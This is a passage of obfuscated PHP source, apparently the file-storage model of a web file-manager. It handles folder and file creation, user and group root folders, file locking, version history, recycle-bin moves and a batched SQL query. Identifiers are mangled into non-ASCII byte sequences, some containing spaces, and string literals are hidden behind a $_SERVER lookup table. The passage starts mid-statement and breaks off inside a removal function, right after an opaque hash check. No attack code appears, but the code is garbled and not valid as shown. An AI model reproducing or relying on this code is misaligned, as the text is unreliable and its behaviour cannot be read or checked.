($‘ì¥ö“‡) { $‘ì¥ö“‡ = is_array($‘ì¥ö“‡) ? $‘ì¥ö“‡ : explode($Îâ¶µŸœ[50], $‘ì¥ö“‡); $ÇŒøÁ§€[$Îâ¶µŸœ[509]] = array($Îâ¶µŸœ[515], $‘ì¥ö“‡); $ÇŒøÁ§€[$Îâ¶µŸœ[508]] = 0; } } } } $this->_parseSearchParent($Ñíõöú’, $ÇŒøÁ§€); if (isset($Ñíõöú’[$Îâ¶µŸœ[2232]]) && trim($Ñíõöú’[$Îâ¶µŸœ[2232]])) { $¡ Ñ‰í… = trim($Ñíõöú’[$Îâ¶µŸœ[2232]]); $ÌÉâ’¹ = explode($Îâ¶µŸœ[53], $¡ Ñ‰í…); if (strlen($¡ Ñ‰í…) > 2 && (substr($¡ Ñ‰í…, 0, 1) == $Îâ¶µŸœ[119] && substr($¡ Ñ‰í…, -1) == $Îâ¶µŸœ[119]) || substr($¡ Ñ‰í…, 0, 1) == $Îâ¶µŸœ[58] && substr($¡ Ñ‰í…, -1) == $Îâ¶µŸœ[58]) { $¡ Ñ‰í… = substr($¡ Ñ‰í…, 1, -1); $ÌÉâ’¹ = array($¡ Ñ‰í…); } $ÇŒøÁ§€[$Îâ¶µŸœ[32]] = array(array($Îâ¶µŸœ[643], $Îâ¶µŸœ[2234] . $¡ Ñ‰í… . $Îâ¶µŸœ[2234])); if (count($ÌÉâ’¹) > 1) { $ÇŒøÁ§€[$Îâ¶µŸœ[32]] = array(); foreach ($ÌÉâ’¹ as $òñó Ôè) { if (!trim($òñó Ôè)) { continue; } $ÇŒøÁ§€[$Îâ¶µŸœ[32]][] = array($Îâ¶µŸœ[643], $Îâ¶µŸœ[2234] . trim($òñó Ôè) . $Îâ¶µŸœ[2234]); } } } return $ÇŒøÁ§€; } private function _parseSearchParent($Ö¥åø, &$Ö“Ÿúß­) { $“¥´èÛÆ =& $_SERVER[‘ÆÜ‘œ]; if (!isset($Ö¥åø[$“¥´èÛÆ[191]]) || !$Ö¥åø[$“¥´èÛÆ[191]]) { return; } $©Ì÷êã¿ = $this->pathInfo($Ö¥åø[$“¥´èÛÆ[191]]); $©™Ô±Îğ = $©Ì÷êã¿[$“¥´èÛÆ[191]] . $“¥´èÛÆ[12] === $“¥´èÛÆ[229]; $ã¿¶ëüÍ = $©Ì÷êã¿[$“¥´èÛÆ[189]] == $“¥´èÛÆ[606]; if ($©Ì÷êã¿[$“¥´èÛÆ[622]] == $“¥´èÛÆ[623]) { $£ëÆ×ä = $this->sourceInfo($Ö¥åø[$“¥´èÛÆ[191]]); $©Ì÷êã¿[$“¥´èÛÆ[612]] = $£ëÆ×ä[$“¥´èÛÆ[612]]; } $Ö“Ÿúß­[$“¥´èÛÆ[682]] = array($“¥´èÛÆ[643], $©Ì÷êã¿[$“¥´èÛÆ[612]] . $Ö¥åø[$“¥´èÛÆ[191]] . $“¥´èÛÆ[644]); $ñ´ƒ¡Ê‘ = isset($Ö¥åø[$“¥´èÛÆ[2098]]) && in_array($“¥´èÛÆ[606], $Ö¥åø[$“¥´èÛÆ[2098]]); if (!$ñ´ƒ¡Ê‘ || !$ã¿¶ëüÍ || !$©™Ô±Îğ || !$©Ì÷êã¿[$“¥´èÛÆ[510]]) { return; } if (!AuthModel::authCheckRoot($©Ì÷êã¿[$“¥´èÛÆ[510]][$“¥´èÛÆ[511]])) { return; } $”úµ‘ÌÏ = $©Ì÷êã¿[$“¥´èÛÆ[597]] . $“¥´èÛÆ[12]; if ($”úµ‘ÌÏ == $“¥´èÛÆ[91]) { unset($Ö“Ÿúß­[$“¥´èÛÆ[682]]); $Ö“Ÿúß­[$“¥´èÛÆ[189]] = self::TYPE_GROUP; return; } $ƒ¡ºÖÈ = Model($“¥´èÛÆ[613])->groupChildrenAll($”úµ‘ÌÏ); $ÃÂêŒÕ = count($ƒ¡ºÖÈ); if ($ÃÂêŒÕ <= 1) { return; } $†Ìí¤£ß = array($“¥´èÛÆ[191] => 0, $“¥´èÛÆ[189] => self::TYPE_GROUP, $“¥´èÛÆ[597] => array($“¥´èÛÆ[7], $ƒ¡ºÖÈ)); $°®©• £ = $this->field($“¥´èÛÆ[2417])->where($†Ìí¤£ß)->limit($ÃÂêŒÕ)->select(); $Ö“Ÿúß­[$“¥´èÛÆ[682]] = array(); foreach ($°®©• £ as $ûçÃ…‡Õ) { $Ö“Ÿúß­[$“¥´èÛÆ[682]][] = array($“¥´èÛÆ[643], $“¥´èÛÆ[621] . $ûçÃ…‡Õ[$“¥´èÛÆ[192]] . $“¥´èÛÆ[644]); } $Ö“Ÿúß­[$“¥´èÛÆ[682]][] = $“¥´èÛÆ[2236]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($’¦ùÔîò) { $©Ê¯©ãö =& $_SERVER[‘ÆÜ‘œ]; $’´ô—Ÿš = Model($©Ê¯©ãö[605])->where(array($©Ê¯©ãö[1921] => $’¦ùÔîò))->find(); $´©½ °§ = $this->_mkdirRoot(SourceModel::TYPE_USER, $’¦ùÔîò, $’´ô—Ÿš[$©Ê¯©ãö[32]]); $this->userDesktopAdd($´©½ °§); return $´©½ °§; } public function userDesktopAdd($Õ§³àƒ) { $¬Ë©ŸØ‚ =& $_SERVER[‘ÆÜ‘œ]; $õíÅàöØ = LNG($¬Ë©ŸØ‚[2418]); $¹´ıšîš = $this->mkdir($Õ§³àƒ, $õíÅàöØ); $this->metaSet($¹´ıšîš, $¬Ë©ŸØ‚[2419], $¬Ë©ŸØ‚[91]); $this->metaSet($Õ§³àƒ, $¬Ë©ŸØ‚[2420], $¹´ıšîš); } public function userPathSafeAdd($ıÏû«Œ) { $ú¶š¬³Ô =& $_SERVER[‘ÆÜ‘œ]; $Ù¾ì©·Ö = Model($ú¶š¬³Ô[605])->getInfoFull($ıÏû«Œ); if (!$Ù¾ì©·Ö) { return !1; } if (_get($Ù¾ì©·Ö, $ú¶š¬³Ô[626])) { return $Ù¾ì©·Ö[$ú¶š¬³Ô[563]][$ú¶š¬³Ô[2421]]; } $†¡¢ˆ™½ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ıÏû«Œ, $ú¶š¬³Ô[2422], $ú¶š¬³Ô[2423]); Model($ú¶š¬³Ô[605])->metaSet($ıÏû«Œ, $ú¶š¬³Ô[2421], $†¡¢ˆ™½); $this->metaSet($†¡¢ˆ™½, $ú¶š¬³Ô[2424], $ıÏû«Œ); return $†¡¢ˆ™½; } public function userPathAppAdd($ˆ³íå—Ã, $ù¥şã = '', $Öáüö­³ = '') { $„„ÑÜ”á =& $_SERVER[‘ÆÜ‘œ]; $¯«¢¦Âˆ = Model($„„ÑÜ”á[605])->getInfoFull($ˆ³íå—Ã); if (!$¯«¢¦Âˆ) { return !1; } $ø˜ø­¹¯ = $¯«¢¦Âˆ[$„„ÑÜ”á[563]] ? $¯«¢¦Âˆ[$„„ÑÜ”á[563]] : array(); $¤¦ûíÔ¾ = $ø˜ø­¹¯[$„„ÑÜ”á[2425]]; if (!$¤¦ûíÔ¾) { $¤¦ûíÔ¾ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ˆ³íå—Ã, $„„ÑÜ”á[2426], $„„ÑÜ”á[2427]); Model($„„ÑÜ”á[605])->metaSet($ˆ³íå—Ã, $„„ÑÜ”á[2425], $¤¦ûíÔ¾ . $„„ÑÜ”á[12]); $this->metaSet($¤¦ûíÔ¾, $„„ÑÜ”á[2425], $ˆ³íå—Ã); } if (!$ù¥şã) { return $¤¦ûíÔ¾; } $ë¶Ò™Ö = $ø˜ø­¹¯[$„„ÑÜ”á[2428] . $ù¥şã]; if (!$ë¶Ò™Ö) { $ë¶Ò™Ö = $this->mkdir($¤¦ûíÔ¾, $ù¥şã); Model($„„ÑÜ”á[605])->metaSet($ˆ³íå—Ã, $„„ÑÜ”á[2428] . $ù¥şã, $ë¶Ò™Ö); $this->metaSet($ë¶Ò™Ö, $„„ÑÜ”á[2428] . $ù¥şã, $ˆ³íå—Ã); } if (!$Öáüö­³) { return $ë¶Ò™Ö; } $…‡Á¢ü‹ = $this->mkdir($ë¶Ò™Ö, $Öáüö­³); return $…‡Á¢ü‹; } public function groupRootAdd($Ü±È¬Îß) { $Îº¾®ó¬ =& $_SERVER[‘ÆÜ‘œ]; $–›ıÕî = Model($Îº¾®ó¬[613])->where(array($Îº¾®ó¬[2221] => $Ü±È¬Îß))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ü±È¬Îß, $–›ıÕî[$Îº¾®ó¬[32]]); } public function systemRootPathAdd($Ùòíİšâ) { if ($Ùòíİšâ != $_SERVER[‘ÆÜ‘œ][636]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Ùòíİšâ); } public function userRootRemove($á¿ûµåİ) { $ĞÂäÅÂ· = $this->targetSourceRoot(SourceModel::TYPE_USER, $á¿ûµåİ, !0); foreach ($ĞÂäÅÂ· as $–ÌÔàòâ) { if (!$–ÌÔàòâ) { continue; } $this->remove($–ÌÔàòâ[$_SERVER[‘ÆÜ‘œ][192]], !1); } } public function groupRootRemove($Ï¥ÒñÊƒ) { $Ç—™¸Ô = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Ï¥ÒñÊƒ); if (!$Ç—™¸Ô) { return; } $this->remove($Ç—™¸Ô[$_SERVER[‘ÆÜ‘œ][192]], !1); } private function _mkdirRoot($‚¤•ç¸Ø, $íïÓ×µù, $æš¶Á¾Û, $†ş¹ŸôÅ = '') { $–Ùõ§Ä« =& $_SERVER[‘ÆÜ‘œ]; $•ĞáßÅ¿ = KodUser::id(); $Òå®‹ı = array($–Ùõ§Ä«[500] => 0, $–Ùõ§Ä«[678] => $‚¤•ç¸Ø, $–Ùõ§Ä«[679] => $íïÓ×µù, $–Ùõ§Ä«[676] => 1, $–Ùõ§Ä«[680] => $•ĞáßÅ¿, $–Ùõ§Ä«[681] => $•ĞáßÅ¿, $–Ùõ§Ä«[677] => $†ş¹ŸôÅ, $–Ùõ§Ä«[682] => $–Ùõ§Ä«[621], $–Ùõ§Ä«[527] => 0, $–Ùõ§Ä«[648] => 0, $–Ùõ§Ä«[566] => 0, $–Ùõ§Ä«[683] => $–Ùõ§Ä«[12]); if ($¶ú™¨’¾ = $this->where($Òå®‹ı)->find()) { return $¶ú™¨’¾[$–Ùõ§Ä«[192]]; } $àì÷Ÿ¥¤ = "\115\157\x64\145\154\x53\x6f\165\162\143\145\56\x6d\x6b\144\x69\x72\122\x6f\x6f\164\x2e{$‚¤•ç¸Ø}\56{$íïÓ×µù}\x2e" . $æš¶Á¾Û; CacheLock::lock($àì÷Ÿ¥¤); $Òå®‹ı[$–Ùõ§Ä«[32]] = $æš¶Á¾Û; $‘éªƒ½œ = $this->add($Òå®‹ı); $îÏ›Ì“ = array($–Ùõ§Ä«[684] => short_id($‘éªƒ½œ)); $this->where(array($–Ùõ§Ä«[514] => $‘éªƒ½œ))->save($îÏ›Ì“); CacheLock::unlock($àì÷Ÿ¥¤); return $‘éªƒ½œ; } private function targetSourceRoot($ØÔÊÍ¸», $ªøş—‘İ, $¼‰Èóš = false) { $ä„æŞ‰ù =& $_SERVER[‘ÆÜ‘œ]; $»éøøõ¦ = array($ä„æŞ‰ù[500] => 0, $ä„æŞ‰ù[678] => $ØÔÊÍ¸», $ä„æŞ‰ù[679] => $ªøş—‘İ); if ($¼‰Èóš) { $¦øŒÜê = $this->where($»éøøõ¦)->select(); return $¦øŒÜê ? $¦øŒÜê : array(); } $Ã£»Ä¿— = $this->where($»éøøõ¦)->find(); return $Ã£»Ä¿— ? $Ã£»Ä¿— : array(); } public function sourceRootGroup($«ØÑ¢„) { $Î¾Àõ× =& $_SERVER[‘ÆÜ‘œ]; if (is_string($«ØÑ¢„)) { $«ØÑ¢„ = array($«ØÑ¢„); } $ƒ¦ çñÓ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $«ØÑ¢„, $Î¾Àõ×[221]); $óÍ–õ¥ = array($Î¾Àõ×[455] => $ƒ¦ çñÓ, $Î¾Àõ×[452] => array($Î¾Àõ×[866] => count($«ØÑ¢„))); $this->_listDataApply($óÍ–õ¥[$Î¾Àõ×[455]]); $this->_listMake($óÍ–õ¥); return array_to_keyvalue($óÍ–õ¥[$Î¾Àõ×[85]], $Î¾Àõ×[597]); } public function mkfile($‘®¸ôó, $£¬ÛşĞ’, $¾Çİäè· = '', $Ì„ˆ£‚ = REPEAT_RENAME) { $ˆÖÓãæ =& $_SERVER[‘ÆÜ‘œ]; $´ŞÀë = KodIO::ioFileDriverGet($ˆÖÓãæ[506] . $‘®¸ôó . $ˆÖÓãæ[412]); $‰ôÑ»â´ = Model($ˆÖÓãæ[704])->addFileByContent($¾Çİäè·, $´ŞÀë, $£¬ÛşĞ’); return $this->_createFileCall($‘®¸ôó, $£¬ÛşĞ’, $‰ôÑ»â´, $Ì„ˆ£‚, $ˆÖÓãæ[1494]); } public function addFile($²Ÿ¥èîä, $¤ºÒ¥ø, $ïä¸Áâ, $„»„‰ÊÁ = false, $ŞëÔöŞ = REPEAT_RENAME) { $Øâ¦è‡ =& $_SERVER[‘ÆÜ‘œ]; $‘êá…É¡ = KodIO::ioFileDriverGet($Øâ¦è‡[506] . $²Ÿ¥èîä . $Øâ¦è‡[412]); $Ü…®›Ğ¥ = Model($Øâ¦è‡[704])->addFile($¤ºÒ¥ø, $‘êá…É¡, $ïä¸Áâ, $„»„‰ÊÁ); return $this->_createFileCall($²Ÿ¥èîä, $ïä¸Áâ, $Ü…®›Ğ¥, $ŞëÔöŞ); } public function addFileByFileID($€‡šÎ‡, $œ˜ä“Ñ, $‚Öïºµ×, $êéß = REPEAT_RENAME) { $ó×à„¿ =& $_SERVER[‘ÆÜ‘œ]; $È¹ŸóÙ = Model($ó×à„¿[704])->find($œ˜ä“Ñ); Model($ó×à„¿[704])->linkAdd($œ˜ä“Ñ); return $this->_createFileCall($€‡šÎ‡, $‚Öïºµ×, $È¹ŸóÙ, $êéß); } public function addFileByRemote($àœô³†É, $ğòÚçˆ£, $•¸Š‰ÈÃ, $³èÑ±×» = array(), $¡öÒÊÙ° = REPEAT_RENAME) { $û§ù½‘İ = Model($_SERVER[‘ÆÜ‘œ][704])->addFileByRemote($ğòÚçˆ£, $•¸Š‰ÈÃ, $³èÑ±×»); return $this->_createFileCall($àœô³†É, $•¸Š‰ÈÃ, $û§ù½‘İ, $¡öÒÊÙ°); } private function _createFileCall($«…ÇöñÜ, $£ïÚø, $±î»·ö, $Óù«½Š›, $¤Ãµº = "\x75\160\x6c\x6f\141\144") { $í±é¥…Ã =& $_SERVER[‘ÆÜ‘œ]; if (!$±î»·ö) { return !1; } $Ìğ²¼É¼ = !1; $this->setMasterDB(); $this->lockWriteStart($«…ÇöñÜ, $£ïÚø); $¸ë‚á™ˆ = $this->fileNameExist($«…ÇöñÜ, $£ïÚø); $¢³Äí‡ = $this->_createFile($«…ÇöñÜ, $£ïÚø, $±î»·ö, $Óù«½Š›, $Ìğ²¼É¼); if (!$Ìğ²¼É¼) { Model($í±é¥…Ã[568])->remove($±î»·ö[$í±é¥…Ã[565]]); } if ($Ìğ²¼É¼ && $¢³Äí‡ && $¢³Äí‡ != $¸ë‚á™ˆ) { Model($í±é¥…Ã[2390])->eventCreate($¢³Äí‡, $¤Ãµº); } $this->lockWriteEnd($«…ÇöñÜ, $£ïÚø); return $¢³Äí‡; } public function mkdir($¬ÁèÜÅ, $òêØãÊ–, $—ü¿‡ò¶ = REPEAT_SKIP) { $Ûôßìóå =& $_SERVER[‘ÆÜ‘œ]; $this->setMasterDB(); $÷£‰¯Éã = $this->sourceInfo($¬ÁèÜÅ); if (!$÷£‰¯Éã) { return !1; } $this->lockWriteStart($¬ÁèÜÅ, $òêØãÊ–); if ($—ü¿‡ò¶ !== !1) { $öìİØ = $this->fileNameExist($¬ÁèÜÅ, $òêØãÊ–); if ($öìİØ && $—ü¿‡ò¶ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¬ÁèÜÅ, $òêØãÊ–); return $öìİØ; } $òêØãÊ– = $this->fileNameAuto($¬ÁèÜÅ, $òêØãÊ–, $—ü¿‡ò¶); } $Š™ë£Ç = array($Ûôßìóå[676] => 1, $Ûôßìóå[517] => $òêØãÊ–, $Ûôßìóå[677] => $Ûôßìóå[12], $Ûôßìóå[566] => 0, $Ûôßìóå[648] => 0); $ûóÈÄ¹¥ = $this->_addSource($Š™ë£Ç, $÷£‰¯Éã); Model($Ûôßìóå[2390])->eventCreate($ûóÈÄ¹¥, $Ûôßìóå[1495]); $this->lockWriteEnd($¬ÁèÜÅ, $òêØãÊ–); return $ûóÈÄ¹¥; } public function listSourceRoot($ñ¹ì„ƒÂ, $ÏŞ–ÈÊ , $İ£ºş¨ = "\163\157\x75\x72\x63\145\111\104\x2c\x74\x61\x72\x67\x65\x74\x49\x44\54\x73\x69\x7a\145") { $á…‡€ë‚ =& $_SERVER[‘ÆÜ‘œ]; $ˆ†¿æ¨« = $á…‡€ë‚[472]; $èÙÚŞ¨õ = array(); $ª¬úÊÉ¢ = 1024 * 50; $ëæáì™† = is_array($ëæáì™†) ? $ëæáì™† : array(); $®ò†¨Ã = count($ÏŞ–ÈÊ ); $¿¸—è™ = $this->tablePrefix . $á…‡€ë‚[479]; for ($‡›·–ÎÂ = 0; $‡›·–ÎÂ < $®ò†¨Ã; $‡›·–ÎÂ++) { $œ¢Õ¥øª = $ÏŞ–ÈÊ [$‡›·–ÎÂ]; $ˆ†¿æ¨« .= "\123\x45\114\x45\x43\x54\x20\x2a\x20\x46\x52\x4f\x4d\x20\50\x53\x45\114\x45\103\124\40{$İ£ºş¨}\x20\x46\122\117\115\x20\x60{$¿¸—è™}\140\x20\127\x48\105\x52\105\40"; $ˆ†¿æ¨« .= "\x60\160\141\x72\x65\x6e\x74\111\x44\140\x3d\x30\40\x41\116\x44\x20\140\x74\141\x72\147\x65\x74\111\104\140\x3d{$œ¢Õ¥øª}\40\x41\x4e\x44\x20\x60\x74\x61\162\x67\x65\164\124\x79\160\145\x60\75{$ñ¹ì„ƒÂ}\x20\x61\156\144\x20\146\151\x6c\x65\x54\171\x70\145\75\47\x27\x20\154\151\155\151\164\40\61\51\40\x61\x73\x20\x74\142\x5f{$‡›·–ÎÂ}\40\x55\x4e\x49\117\x4e\40\x41\x4c\x4c\40"; if ((strlen($ˆ†¿æ¨«) >= $ª¬úÊÉ¢ || $‡›·–ÎÂ == $®ò†¨Ã - 1) && $ˆ†¿æ¨«) { $ˆ†¿æ¨« = substr($ˆ†¿æ¨«, 0, -strlen($á…‡€ë‚[1156])); $»º†ŒØä = $this->query($ˆ†¿æ¨«); $ˆ†¿æ¨« = $á…‡€ë‚[12]; $èÙÚŞ¨õ = array_merge($èÙÚŞ¨õ, $»º†ŒØä); } } return $èÙÚŞ¨õ; } private function _createFile($Ëè‘ÃïŸ, $øè§½Âì, $Êæ™éÒ, $×Âß€²ã, &$æ õÉ˜) { $„‹’È® =& $_SERVER[‘ÆÜ‘œ]; $ÓñöÙ¬ğ = $this->sourceInfo($Ëè‘ÃïŸ); if (!$Êæ™éÒ || !$ÓñöÙ¬ğ) { return !1; } if ($×Âß€²ã !== !1) { $±¸ã£™Ç = $this->fileNameExist($Ëè‘ÃïŸ, $øè§½Âì); } $æ õÉ˜ = !0; if ($×Âß€²ã && $±¸ã£™Ç) { if ($×Âß€²ã == REPEAT_SKIP) { $æ õÉ˜ = !1; return $±¸ã£™Ç; } else { if ($×Âß€²ã == REPEAT_REPLACE) { $º¥³”·£ = $this->sourceInfo($±¸ã£™Ç); $¶×ã˜Ø = $this->fileHistory($º¥³”·£, $Êæ™éÒ[$„‹’È®[565]], $Êæ™éÒ[$„‹’È®[79]]); if (!$¶×ã˜Ø) { $æ õÉ˜ = !1; } else { $this->folderSizeReset($Ëè‘ÃïŸ); } return $±¸ã£™Ç; } else { $øè§½Âì = $this->fileNameAuto($Ëè‘ÃïŸ, $øè§½Âì, $×Âß€²ã, !1); } } } $÷—Œœ³† = array($„‹’È®[676] => 0, $„‹’È®[517] => $øè§½Âì, $„‹’È®[677] => substr(get_path_ext($øè§½Âì), 0, 10), $„‹’È®[566] => $Êæ™éÒ[$„‹’È®[565]], $„‹’È®[648] => $Êæ™éÒ[$„‹’È®[79]]); $¸‘ÊÚ â = $this->_addSource($÷—Œœ³†, $ÓñöÙ¬ğ); $this->folderSizeReset($Ëè‘ÃïŸ, intval($÷—Œœ³†[$„‹’È®[79]])); return $¸‘ÊÚ â; } protected function fileHistory($’ïüÎÛ, $õÚúşÈŒ, $·ÙÓÛğğ) { $ÑâÈ¾ü¬ =& $_SERVER[‘ÆÜ‘œ]; if ($’ïüÎÛ[$ÑâÈ¾ü¬[565]] == $õÚúşÈŒ) { return !1; } $this->checkLock($’ïüÎÛ[$ÑâÈ¾ü¬[192]], $õÚúşÈŒ); Model($ÑâÈ¾ü¬[2429])->addHistory($’ïüÎÛ); $¥ ªæûÂ = array($ÑâÈ¾ü¬[681] => USER_ID, $ÑâÈ¾ü¬[521] => time(), $ÑâÈ¾ü¬[565] => $õÚúşÈŒ, $ÑâÈ¾ü¬[79] => $·ÙÓÛğğ); $this->where(array($ÑâÈ¾ü¬[514] => $’ïüÎÛ[$ÑâÈ¾ü¬[192]]))->save($¥ ªæûÂ); $this->sourceCacheClear($’ïüÎÛ[$ÑâÈ¾ü¬[192]]); return !0; } public function checkLock($Ñ§ííÎ¾, $ôŠì•“ç) { $êÓ€š¯™ =& $_SERVER[‘ÆÜ‘œ]; $Äş¨úß¼ = $this->pathInfo($Ñ§ííÎ¾); if (!$this->fileIsLock($Äş¨úß¼, !0)) { return; } $Ô‘”’¹ = Session::get($êÓ€š¯™[2430]); $äîé¦Š = substr($Äş¨úß¼[$êÓ€š¯™[32]], 0, -1 - strlen($Äş¨úß¼[$êÓ€š¯™[167]])) . $êÓ€š¯™[1347] . $Ô‘”’¹ . $êÓ€š¯™[10] . $Äş¨úß¼[$êÓ€š¯™[167]]; $İ°àòß = Model($êÓ€š¯™[704])->find($ôŠì•“ç); $this->_createFileCall($Äş¨úß¼[$êÓ€š¯™[191]], $äîé¦Š, $İ°àòß, REPEAT_REPLACE, $êÓ€š¯™[1494]); $¿‘ í±¼ = $Äş¨úß¼[$êÓ€š¯™[563]][$êÓ€š¯™[641]]; $Œ—á”¼Ø = $¿‘ í±¼[$êÓ€š¯™[2431]] ? $¿‘ í±¼[$êÓ€š¯™[2431]] : $¿‘ í±¼[$êÓ€š¯™[32]]; show_json(LNG($êÓ€š¯™[2432]) . $êÓ€š¯™[2433] . LNG($êÓ€š¯™[2434]) . $êÓ€š¯™[2435] . $Œ—á”¼Ø . $êÓ€š¯™[2436], !1); } public function fileIsLock($‰ÅêòÁü, $Êù¥Ó’‡ = false) { $©ŞµôîÏ =& $_SERVER[‘ÆÜ‘œ]; if (!_get($‰ÅêòÁü, $©ŞµôîÏ[637], 0)) { return !1; } if ($‰ÅêòÁü[$©ŞµôîÏ[563]][$©ŞµôîÏ[640]] != USER_ID) { return !0; } $éÕ±º½˜ = $GLOBALS[$©ŞµôîÏ[6]][$©ŞµôîÏ[92]][$©ŞµôîÏ[638]]; if ($‰ÅêòÁü[$©ŞµôîÏ[563]][$©ŞµôîÏ[639]] <= time() - $éÕ±º½˜) { $this->metaSet($‰ÅêòÁü[$©ŞµôîÏ[192]], $©ŞµôîÏ[640], null); $this->metaSet($‰ÅêòÁü[$©ŞµôîÏ[192]], $©ŞµôîÏ[639], null); } if ($Êù¥Ó’‡) { $this->metaSet($‰ÅêòÁü[$©ŞµôîÏ[192]], $©ŞµôîÏ[639], time()); } return !1; } private function _addSource($¦ŸÙ¨é½, $ß·¡àÈÌ) { $ó›ƒ›ü€ =& $_SERVER[‘ÆÜ‘œ]; $Şóú‰Ø† = KodUser::id(); $õàıª¼á = array($ó›ƒ›ü€[678] => $ß·¡àÈÌ[$ó›ƒ›ü€[189]], $ó›ƒ›ü€[679] => $ß·¡àÈÌ[$ó›ƒ›ü€[597]], $ó›ƒ›ü€[680] => $Şóú‰Ø†, $ó›ƒ›ü€[681] => $Şóú‰Ø†, $ó›ƒ›ü€[500] => $ß·¡àÈÌ[$ó›ƒ›ü€[192]], $ó›ƒ›ü€[682] => $ß·¡àÈÌ[$ó›ƒ›ü€[612]] . $ß·¡àÈÌ[$ó›ƒ›ü€[192]] . $ó›ƒ›ü€[50], $ó›ƒ›ü€[527] => 0, $ó›ƒ›ü€[683] => $ó›ƒ›ü€[12]); $¦ŸÙ¨é½ = array_merge($õàıª¼á, $¦ŸÙ¨é½); $this->updateModifyTime($¦ŸÙ¨é½[$ó›ƒ›ü€[191]]); $‹Ô½Ş´Ñ = $ó›ƒ›ü€[2437] . $ß·¡àÈÌ[$ó›ƒ›ü€[192]]; if (isset(self::$cacheChildList[$‹Ô½Ş´Ñ])) { unset(self::$cacheChildList[$‹Ô½Ş´Ñ]); } static $¨Ç§–Ï = false; if (!$¨Ç§–Ï) { Hook::trigger($ó›ƒ›ü€[666], $¦ŸÙ¨é½); $¨Ç§–Ï = !0; } $ø€ŞƒÏô = $this->add($¦ŸÙ¨é½); $²±èì˜ = array($ó›ƒ›ü€[684] => short_id($ø€ŞƒÏô)); $this->where(array($ó›ƒ›ü€[514] => $ø€ŞƒÏô))->save($²±èì˜); $this->setNamePinyin($ø€ŞƒÏô, $¦ŸÙ¨é½[$ó›ƒ›ü€[32]]); return $ø€ŞƒÏô; } public function remove($şÄÇê´Ï, $ŸöÒ¡ı = true) { $à²ÖÛ£Ô =& $_SERVER[‘ÆÜ‘œ]; $ããÒ°”® = $this->sourceInfo($şÄÇê´Ï); $—×¦ ù = intval($ããÒ°”®[$à²ÖÛ£Ô[189]]) === self::TYPE_SYSTEM; $œäß‘ƒû = Model($à²ÖÛ£Ô[530])->get($à²ÖÛ£Ô[2438]) == $à²ÖÛ£Ô[91]; if ($—×¦ ù || $ŸöÒ¡ı || !$œäß‘ƒû) { return $this->removeNow($şÄÇê´Ï, $ŸöÒ¡ı); } $„ºøˆ¤° = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÆÓúÔîÍ = $ããÒ°”®[$à²ÖÛ£Ô[189]] == self::TYPE_USER ? $à²ÖÛ£Ô[692] : $à²ÖÛ£Ô[606]; if ($ÆÓúÔîÍ == $à²ÖÛ£Ô[692]) { $àÉ¸ÂÅø = Model($à²ÖÛ£Ô[605])->getInfo($ããÒ°”®[$à²ÖÛ£Ô[597]]); $˜â²·­Ó = !empty($àÉ¸ÂÅø[$à²ÖÛ£Ô[2431]]) ? $àÉ¸ÂÅø[$à²ÖÛ£Ô[2431]] : $àÉ¸ÂÅø[$à²ÖÛ£Ô[32]]; $˜â²·­Ó = $à²ÖÛ£Ô[347] . $˜â²·­Ó . $à²ÖÛ£Ô[2439] . $ããÒ°”®[$à²ÖÛ£Ô[597]]; } else { $àÉ¸ÂÅø = Model($à²ÖÛ£Ô[613])->getInfo($ããÒ°”®[$à²ÖÛ£Ô[597]]); $˜â²·­Ó = _get($àÉ¸ÂÅø, $à²ÖÛ£Ô[32]); $˜â²·­Ó = $à²ÖÛ£Ô[174] . $˜â²·­Ó . $à²ÖÛ£Ô[2440] . $ããÒ°”®[$à²ÖÛ£Ô[597]]; } $ÚÍî¨Æá = $à²ÖÛ£Ô[2441] . md5($˜â²·­Ó); CacheLock::lock($ÚÍî¨Æá); $¼í‚ğû› = $this->fileNameExist($„ºøˆ¤°, $˜â²·­Ó); if (!$¼í‚ğû›) { $¼í‚ğû› = $this->mkdir($„ºøˆ¤°, $˜â²·­Ó, REPEAT_SKIP); $this->metaSet($¼í‚ğû›, $à²ÖÛ£Ô[2442], $ÆÓúÔîÍ); $this->metaSet($¼í‚ğû›, $à²ÖÛ£Ô[2443], $ããÒ°”®[$à²ÖÛ£Ô[597]]); if ($ããÒ°”®[$à²ÖÛ£Ô[191]] != 0) { $this->metaSet($¼í‚ğû›, $à²ÖÛ£Ô[2444], _get($àÉ¸ÂÅø, $à²ÖÛ£Ô[2445])); } } CacheLock::unlock($ÚÍî¨Æá); $this->metaSet($şÄÇê´Ï, $à²ÖÛ£Ô[2446], $ããÒ°”®[$à²ÖÛ£Ô[191]]); $this->where(array($à²ÖÛ£Ô[192] => $şÄÇê´Ï))->save(array($à²ÖÛ£Ô[521] => time())); $this->recycleClear($ããÒ°”®); Model($à²ÖÛ£Ô[663])->eventRemove($şÄÇê´Ï); $®şµÚ§ = $this->move($şÄÇê´Ï, $¼í‚ğû›, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ããÒ°”®[$à²ÖÛ£Ô[191]]); return $®şµÚ§; } private function recycleClear($Å×Ë“İÔ) { $ùñûˆòÚ =& $_SERVER[‘ÆÜ‘œ]; $–Ñ¾ßÖÍ = $this->childrenAll($Å×Ë“İÔ); $©€üğñì = array($ùñûˆòÚ[514] => array($ùñûˆòÚ[515], $–Ñ¾ßÖÍ[$ùñûˆòÚ[2447]])); Model($ùñûˆòÚ[2448])->where($©€üğñì)->delete(); } public function removeNow($¡–à„, $€ãÆ“òË = true) { $šõ÷ŠåÚ =& $_SERVER[‘ÆÜ‘œ]; $ô¨î¾äÇ = $_SERVER[$šõ÷ŠåÚ[326]] . $šõ÷ŠåÚ[327]; $å–Æö• = $šõ÷ŠåÚ[323]; if ($_SERVER[$šõ÷ŠåÚ[324]] != $å–Æö•($ô¨î¾äÇ)) { $öİ””°§ = $šõ÷ŠåÚ[995]; $µ¡’ü¶ë = $šõ÷ŠåÚ[325]; $¬… Ó¬’ = $_SERVER[$šõ÷ŠåÚ[326]] . $šõ÷ŠåÚ[327]; $Œ·â¢‡é = 